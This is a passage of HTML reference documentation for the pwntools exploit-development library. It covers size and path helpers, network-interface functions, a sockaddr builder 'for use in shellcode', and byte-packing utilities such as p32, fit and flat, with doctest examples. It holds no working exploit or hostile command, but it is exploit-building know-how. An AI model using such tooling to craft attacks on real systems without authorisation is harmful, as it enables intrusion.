<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">(</span><span class="mi">451</span><span class="p">)</span>
<span class="go">&#39;451B&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="go">&#39;1000B&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="go">&#39;1.00KB&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="s1">&#39; bytes&#39;</span><span class="p">)</span>
<span class="go">&#39;1.00K bytes&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="n">si</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;1.02KB&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="p">[</span><span class="n">size</span><span class="p">(</span><span class="mi">1024</span> <span class="o">**</span> <span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
<span class="go">[&#39;1B&#39;, &#39;1.00KB&#39;, &#39;1.00MB&#39;, &#39;1.00GB&#39;, &#39;1.00TB&#39;, &#39;1.00PB&#39;, &#39;1024.00PB&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">([])</span>
<span class="go">&#39;0B&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">size</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">])</span>
<span class="go">&#39;3B&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.which">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">which</code><span class="sig-paren">(</span><em>name</em>, <em>flags = os.X_OK</em>, <em>all = False</em><span class="sig-paren">)</span> &#x2192; str or str set<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L129-177"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.which" title="Permalink to this definition">¶</a></dt>
<dd><p>Works as the system command <code class="docutils literal"><span class="pre">which</span></code>; searches $PATH for <code class="docutils literal"><span class="pre">name</span></code> and
returns a full path if found.</p>
<p>If <cite>all</cite> is <code class="xref py py-const docutils literal"><span class="pre">True</span></code> the set of all found locations is returned, else
the first occurence or <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The file to search for.</li>
<li><strong>all</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to return all locations where <cite>name</cite> was found.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">If <cite>all</cite> is <code class="xref py py-const docutils literal"><span class="pre">True</span></code> the set of all locations where <cite>name</cite> was found,
else the first location or <code class="xref py py-const docutils literal"><span class="pre">None</span></code> if not found.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
<span class="go">&#39;/bin/sh&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.write">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">write</code><span class="sig-paren">(</span><em>path</em>, <em>data=''</em>, <em>create_dir=False</em>, <em>mode='w'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L120-127"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.write" title="Permalink to this definition">¶</a></dt>
<dd><p>Create new file or truncate existing to zero length and write data.</p>
</dd></dl>

</div>
<span id="document-util/net"></span><div class="section" id="module-pwnlib.util.net">
<span id="pwnlib-util-net-networking-interfaces"></span><h3><a class="reference internal" href="#module-pwnlib.util.net" title="pwnlib.util.net"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.net</span></code></a> &#8212; Networking interfaces<a class="headerlink" href="#module-pwnlib.util.net" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.net.getifaddrs">
<code class="descclassname">pwnlib.util.net.</code><code class="descname">getifaddrs</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; dict list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/net.py#L74-121"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.net.getifaddrs" title="Permalink to this definition">¶</a></dt>
<dd><p>A wrapper for libc&#8217;s <code class="docutils literal"><span class="pre">getifaddrs</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>None</strong> &#8211; </td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">list of dictionaries each representing a <cite>struct ifaddrs</cite>. The
dictionaries have the fields <cite>name</cite>, <cite>flags</cite>, <cite>family</cite>, <cite>addr</cite> and
<cite>netmask</cite>.  Refer to <cite>getifaddrs(3)</cite> for details.  The fields <cite>addr</cite> and
<cite>netmask</cite> are themselves dictionaries.  Their structure depend on
<cite>family</cite>.  If <cite>family</cite> is not <code class="xref py py-const docutils literal"><span class="pre">socket.AF_INET</span></code> or
<code class="xref py py-const docutils literal"><span class="pre">socket.AF_INET6</span></code> they will be empty.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.net.interfaces">
<code class="descclassname">pwnlib.util.net.</code><code class="descname">interfaces</code><span class="sig-paren">(</span><em>all = False</em><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/net.py#L123-147"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.net.interfaces" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>all</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to include interfaces with not associated address.</li>
<li><strong>Default</strong> &#8211; <code class="xref py py-const docutils literal"><span class="pre">False</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A dictionary mapping each of the hosts interfaces to a list of it&#8217;s
addresses.  Each entry in the list is a tuple <code class="docutils literal"><span class="pre">(family,</span> <span class="pre">addr)</span></code>, and
<cite>family</cite> is either <code class="xref py py-const docutils literal"><span class="pre">socket.AF_INET</span></code> or <code class="xref py py-const docutils literal"><span class="pre">socket.AF_INET6</span></code>.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.net.interfaces4">
<code class="descclassname">pwnlib.util.net.</code><code class="descname">interfaces4</code><span class="sig-paren">(</span><em>all = False</em><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/net.py#L149-168"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.net.interfaces4" title="Permalink to this definition">¶</a></dt>
<dd><p>As <a class="reference internal" href="#pwnlib.util.net.interfaces" title="pwnlib.util.net.interfaces"><code class="xref py py-func docutils literal"><span class="pre">interfaces()</span></code></a> but only includes IPv4 addresses and the lists in the
dictionary only contains the addresses not the family.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>all</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to include interfaces with not associated address.</li>
<li><strong>Default</strong> &#8211; <code class="xref py py-const docutils literal"><span class="pre">False</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A dictionary mapping each of the hosts interfaces to a list of it&#8217;s
IPv4 addresses.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.net.interfaces6">
<code class="descclassname">pwnlib.util.net.</code><code class="descname">interfaces6</code><span class="sig-paren">(</span><em>all = False</em><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/net.py#L170-189"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.net.interfaces6" title="Permalink to this definition">¶</a></dt>
<dd><p>As <a class="reference internal" href="#pwnlib.util.net.interfaces" title="pwnlib.util.net.interfaces"><code class="xref py py-func docutils literal"><span class="pre">interfaces()</span></code></a> but only includes IPv6 addresses and the lists in the
dictionary only contains the addresses not the family.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>all</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to include interfaces with not associated address.</li>
<li><strong>Default</strong> &#8211; <code class="xref py py-const docutils literal"><span class="pre">False</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A dictionary mapping each of the hosts interfaces to a list of it&#8217;s
IPv6 addresses.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.net.sockaddr">
<code class="descclassname">pwnlib.util.net.</code><code class="descname">sockaddr</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network = 'ipv4') -&gt; (data</em>, <em>length</em>, <em>family</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/net.py#L191-226"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.net.sockaddr" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a sockaddr_in or sockaddr_in6 memory buffer for use in shellcode.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>host</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either an IP address or a hostname to be looked up.</li>
<li><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; TCP/UDP port.</li>
<li><strong>network</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A tuple containing the sockaddr buffer, length, and the address family.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

</div>
<span id="document-util/packing"></span><div class="section" id="module-pwnlib.util.packing">
<span id="pwnlib-util-packing-packing-and-unpacking-of-strings"></span><h3><a class="reference internal" href="#module-pwnlib.util.packing" title="pwnlib.util.packing"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.packing</span></code></a> &#8212; Packing and unpacking of strings<a class="headerlink" href="#module-pwnlib.util.packing" title="Permalink to this headline">¶</a></h3>
<p>Module for packing and unpacking integers.</p>
<p>Simplifies access to the standard <code class="docutils literal"><span class="pre">struct.pack</span></code> and <code class="docutils literal"><span class="pre">struct.unpack</span></code>
functions, and also adds support for packing/unpacking arbitrary-width
integers.</p>
<p>The packers are all context-aware for <code class="docutils literal"><span class="pre">endian</span></code> and <code class="docutils literal"><span class="pre">signed</span></code> arguments,
though they can be overridden in the parameters.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="go">&#39;\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="go">&#39;\xef\xbe\xad\xde&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
<span class="go">&#39;\xde\xad\xbe\xef&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">):</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="go">&#39;\xde\xad\xbe\xef&#39;</span>
</pre></div>
</div>
<p>Make a frozen packer, which does not change with context.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">=</span><span class="n">make_packer</span><span class="p">(</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="p">(</span><span class="mh">0xff</span><span class="p">)</span>
<span class="go">&#39;\xff&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="p">(</span><span class="mh">0x1ff</span><span class="p">)</span>
<span class="go">&#39;\xff\x01&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">):</span> <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x1ff</span><span class="p">))</span>
<span class="go">&#39;\xff\x01&#39;</span>
</pre></div>
</div>
<dl class="function">
<dt id="pwnlib.util.packing.dd">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">dd</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em>, <em>count = 0</em>, <em>skip = 0</em>, <em>seek = 0</em>, <em>truncate = False</em><span class="sig-paren">)</span> &#x2192; dst<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L683-861"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.dd" title="Permalink to this definition">¶</a></dt>
<dd><p>Inspired by the command line tool <code class="docutils literal"><span class="pre">dd</span></code>, this function copies <cite>count</cite> byte
values from offset <cite>seek</cite> in <cite>src</cite> to offset <cite>skip</cite> in <cite>dst</cite>.  If <cite>count</cite> is
0, all of <code class="docutils literal"><span class="pre">src[seek:]</span></code> is copied.</p>
<p>If <cite>dst</cite> is a mutable type it will be updated.  Otherwise a new instance of
the same type will be created.  In either case the result is returned.</p>
<p><cite>src</cite> can be an iterable of characters or integers, a unicode string or a
file object.  If it is an iterable of integers, each integer must be in the
range [0;255].  If it is a unicode string, its UTF-8 encoding will be used.</p>
<p>The seek offset of file objects will be preserved.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>dst</strong> &#8211; Supported types are <cite>:class:file</cite>, <cite>:class:list</cite>, <cite>:class:tuple</cite>,
<cite>:class:str</cite>, <cite>:class:bytearray</cite> and <cite>:class:unicode</cite>.</li>
<li><strong>src</strong> &#8211; An iterable of byte values (characters or integers), a unicode
string or a file object.</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; How many bytes to copy.  If <cite>count</cite> is 0 or larger than
<code class="docutils literal"><span class="pre">len(src[seek:])</span></code>, all bytes until the end of <cite>src</cite> are
copied.</li>
<li><strong>skip</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Offset in <cite>dst</cite> to copy to.</li>
<li><strong>seek</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Offset in <cite>src</cite> to copy from.</li>
<li><strong>truncate</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If <cite>:const:True</cite>, <cite>dst</cite> is truncated at the last copied
byte.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A modified version of <cite>dst</cite>.  If <cite>dst</cite> is a mutable type it will be
modified in-place.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">dd</span><span class="p">(</span><span class="nb">tuple</span><span class="p">(</span><span class="s1">&#39;Hello!&#39;</span><span class="p">),</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="n">skip</span> <span class="o">=</span> <span class="mi">5</span><span class="p">)</span>
<span class="go">(&#39;H&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39;?&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">dd</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="s1">&#39;Hello!&#39;</span><span class="p">),</span> <span class="p">(</span><span class="mi">63</span><span class="p">,),</span> <span class="n">skip</span> <span class="o">=</span> <span class="mi">5</span><span class="p">)</span>
<span class="go">[&#39;H&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39;?&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/foo&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">dd</span><span class="p">(</span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/foo&#39;</span><span class="p">),</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;/dev/zero&#39;</span><span class="p">),</span> <span class="n">skip</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="go">&#39;AAA\x00\x00\x00\x00AAA&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/foo&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">dd</span><span class="p">(</span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/foo&#39;</span><span class="p">),</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;/dev/zero&#39;</span><span class="p">),</span> <span class="n">skip</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span> <span class="n">truncate</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="go">&#39;AAA\x00\x00\x00\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.fit">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">fit</code><span class="sig-paren">(</span><em>pieces</em>, <em>filler = de_bruijn()</em>, <em>length = None</em>, <em>preprocessor = None</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.fit" title="Permalink to this definition">¶</a></dt>
<dd><p>Generates a string from a dictionary mapping offsets to data to place at
that offset.</p>
<p>For each key-value pair in <cite>pieces</cite>, the key is either an offset or a byte
sequence.  In the latter case, the offset will be the lowest index at which
the sequence occurs in <cite>filler</cite>.  See examples below.</p>
<p>Each piece of data is passed to <a class="reference internal" href="#pwnlib.util.packing.flat" title="pwnlib.util.packing.flat"><code class="xref py py-meth docutils literal"><span class="pre">flat()</span></code></a> along with the keyword
arguments <cite>word_size</cite>, <cite>endianness</cite> and <cite>sign</cite>.</p>
<p>Space between pieces of data is filled out using the iterable <cite>filler</cite>.  The
<cite>n</cite>&#8216;th byte in the output will be byte at index <code class="docutils literal"><span class="pre">n</span> <span class="pre">%</span> <span class="pre">len(iterable)</span></code> byte
in <cite>filler</cite> if it has finite length or the byte at index <cite>n</cite> otherwise.</p>
<p>If <cite>length</cite> is given, the output will padded with bytes from <cite>filler</cite> to be
this size.  If the output is longer than <cite>length</cite>, a <code class="xref py py-exc docutils literal"><span class="pre">ValueError</span></code>
exception is raised.</p>
<p>If entries in <cite>pieces</cite> overlap, a <code class="xref py py-exc docutils literal"><span class="pre">ValueError</span></code> exception is
raised.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>pieces</strong> &#8211; Offsets and values to output.</li>
<li><strong>length</strong> &#8211; The length of the output.</li>
<li><strong>filler</strong> &#8211; Iterable to use for padding.</li>
<li><strong>preprocessor</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; Gets called on every element to optionally
transform the element before flattening. If <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is
returned, then the original value is used.</li>
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Word size of the converted integer.</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;).</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (False/True)</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">fit</span><span class="p">({</span><span class="mi">12</span><span class="p">:</span> <span class="mh">0x41414141</span><span class="p">,</span>
<span class="gp">... </span>     <span class="mi">24</span><span class="p">:</span> <span class="s1">&#39;Hello&#39;</span><span class="p">,</span>
<span class="gp">... </span>    <span class="p">})</span>
<span class="go">&#39;aaaabaaacaaaAAAAeaaafaaaHello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">fit</span><span class="p">({</span><span class="s1">&#39;caaa&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
<span class="go">&#39;aaaabaaa&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">fit</span><span class="p">({</span><span class="mi">12</span><span class="p">:</span> <span class="s1">&#39;XXXX&#39;</span><span class="p">},</span> <span class="n">filler</span> <span class="o">=</span> <span class="s1">&#39;AB&#39;</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">20</span><span class="p">)</span>
<span class="go">&#39;ABABABABABABXXXXABAB&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">fit</span><span class="p">({</span> <span class="mi">8</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x42424242</span><span class="p">],</span>
<span class="gp">... </span>     <span class="mi">20</span><span class="p">:</span> <span class="s1">&#39;CCCC&#39;</span><span class="p">})</span>
<span class="go">&#39;aaaabaaaAAAABBBBeaaaCCCC&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">fit</span><span class="p">({</span> <span class="mh">0x61616162</span><span class="p">:</span> <span class="s1">&#39;X&#39;</span><span class="p">})</span>
<span class="go">&#39;aaaaX&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.flat">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">flat</code><span class="sig-paren">(</span><em>*args</em>, <em>preprocessor = None</em>, <em>word_size = None</em>, <em>endianness = None</em>, <em>sign = None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.flat" title="Permalink to this definition">¶</a></dt>
<dd><p>Flattens the arguments into a string.</p>
<p>This function takes an arbitrary number of arbitrarily nested lists and
tuples. It will then find every string and number inside those and flatten
them out. Strings are inserted directly while numbers are packed using the
<a class="reference internal" href="#pwnlib.util.packing.pack" title="pwnlib.util.packing.pack"><code class="xref py py-func docutils literal"><span class="pre">pack()</span></code></a> function.</p>
<p>The three kwargs <cite>word_size</cite>, <cite>endianness</cite> and <cite>sign</cite> will default to using
values in <a class="reference internal" href="index.html#module-pwnlib.context" title="pwnlib.context"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.context</span></code></a> if not specified as an argument.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>args</strong> &#8211; Values to flatten</li>
<li><strong>preprocessor</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; Gets called on every element to optionally
transform the element before flattening. If <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is
returned, then the original value is uded.</li>
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Word size of the converted integer.</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;).</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (False/True)</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">flat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="p">[[[</span><span class="s2">&quot;AB&quot;</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="mi">3</span><span class="p">],</span> <span class="n">endianness</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">word_size</span> <span class="o">=</span> <span class="mi">16</span><span class="p">,</span> <span class="n">sign</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
<span class="go">&#39;\x01\x00testABABABABABAB&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">flat</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]],</span> <span class="n">preprocessor</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
<span class="go">&#39;234&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.make_packer">
